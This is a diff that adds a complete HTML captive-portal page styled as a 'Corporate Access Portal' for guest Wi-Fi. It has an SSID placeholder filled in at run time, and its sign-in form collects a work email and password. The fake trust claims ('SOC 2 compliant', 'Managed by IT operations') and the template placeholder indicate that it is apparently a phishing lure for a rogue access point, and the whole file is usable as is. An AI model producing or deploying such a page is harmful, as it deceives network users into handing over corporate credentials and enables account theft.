@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Corporate Access Portal</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:#0a0d12;color:#dde2ea;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.corp{width:100%;max-width:900px;display:grid;grid-template-columns:1.2fr 1fr;background:#0f1319;border:1px solid #222a35;border-radius:14px;overflow:hidden;box-shadow:0 24px 70px rgba(0,0,0,.6)}
+.left{padding:44px 40px;background:linear-gradient(160deg,#10151d 0%,#0a0d12 100%);border-right:1px solid #1d2430}
+.logo{display:flex;align-items:center;gap:12px;margin-bottom:36px}
+.logo .mark{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#2f6df6,#8b5cf6);display:flex;align-items:center;justify-content:center}
+.logo .mark span{color:#fff;font-size:18px;font-weight:700}
+.logo b{font-size:17px;color:#e6ecf5}
+h1{font-size:24px;font-weight:700;margin-bottom:10px}
+.left p{font-size:14px;color:#94a3b8;line-height:1.6;margin-bottom:28px}
+.feats{display:flex;flex-direction:column;gap:14px}
+.feat{display:flex;gap:12px;color:#94a3b8;font-size:13px}
+.feat svg{width:18px;height:18px;fill:#2f6df6;flex:none;margin-top:1px}
+.right{padding:44px 36px}
+h2{font-size:16px;font-weight:600;margin-bottom:6px}
+.sub{font-size:13px;color:#94a3b8;margin-bottom:26px}
+input[type=text],input[type=password]{width:100%;background:#0c1016;border:1px solid #232c39;border-radius:8px;padding:12px 14px;color:#dde2ea;font-size:14px;outline:none;margin-bottom:14px}
+input:focus{border-color:#4c6ef5}
+button{width:100%;background:#2f6df6;border:none;border-radius:8px;padding:13px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
+button:active{background:#2658cc}
+.help{font-size:12px;color:#64748b;text-align:center;margin-top:18px}
+@media(max-width:700px){.corp{grid-template-columns:1fr}.left{display:none}}
+</style>
+</head>
+<body>
+<div class="corp">
+  <div class="left">
+    <div class="logo"><div class="mark"><span>N</span></div><b>Corporate Network</b></div>
+    <h1>Secure Guest Access</h1>
+    <p>Connect to the corporate guest network. By continuing, you agree to the acceptable-use policy and monitoring of network activity.</p>
+    <div class="feats">
+      <div class="feat"><svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 0 1 5 5h-2a3 3 0 0 0-6 0H7a5 5 0 0 1 5-5z"/></svg><span>Encrypted enterprise connection</span></div>
+      <div class="feat"><svg viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7v2h1v5h-6v4H6v-9h1V9a5 5 0 0 1 5-5z"/></svg><span>SOC 2 compliant infrastructure</span></div>
+      <div class="feat"><svg viewBox="0 0 24 24"><path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4zm0 2c-2.33 0-7 1.17-7 3.5V20h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg><span>Managed by IT operations</span></div>
+    </div>
+  </div>
+  <div class="right">
+    <h2>Authorize your device</h2>
+    <p class="sub">Network: "__MALSTROM_SSID__"</p>
+    <form id="f" action="/" method="post">
+      <input type="text" id="username" name="username" placeholder="Work email or username" autocomplete="off">
+      <input type="password" id="password" name="password" placeholder="Password" required autofocus>
+      <button type="submit">Sign in</button>
+    </form>
+    <div class="help">Need help? Contact the IT help desk.</div>
+  </div>
+</div>
+</body>
+</html>
